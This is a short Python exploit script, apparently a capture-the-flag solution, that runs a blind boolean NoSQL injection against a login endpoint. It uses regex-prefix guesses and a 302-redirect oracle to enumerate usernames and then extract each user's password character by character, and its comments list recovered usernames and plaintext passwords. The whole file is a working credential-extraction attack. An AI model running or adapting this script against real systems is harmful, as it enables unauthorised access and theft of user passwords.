import yasqlit as ya
import string
from functools import partial


def pPayload(p):
    sqli = f'^{p}'
    return sqli

def boolPredicate(res):
    if res.status_code == 302:
        return True
    else:
        return False

def pwn():
    t = ya.Transport(payloadProcessor=pPayload, predicate=boolPredicate, requestPath='req-user.txt')
    pTmp = partial('{guess}'.format)
    users = ya.boolExfiltrateList(t, pTmp, 'nosql', searchChars=string.ascii_lowercase, exfilType=ya.BoolExfiltrateType.NOSQL)
    # users = ['admin', 'mango']
    for user in users:
        with open('req-pass.txt', 'r') as f:
            userFilled = f.read().replace('{user}', user)
            t.client = ya.HttpClient.parse(userFilled, debug=True)
            searchChars = ''.join(list(set(string.printable)-set(string.whitespace)))
            # pTmp = partial('PREFIX{guess}'.format)
            passwords = ya.boolExfiltrateList(t, pTmp, 'nosql', searchChars=searchChars, exfilType=ya.BoolExfiltrateType.NOSQL)
            # passwords = ['t9KcS3>!0B#2', 'h3mXK8RhU~f{]f5H']

pwn()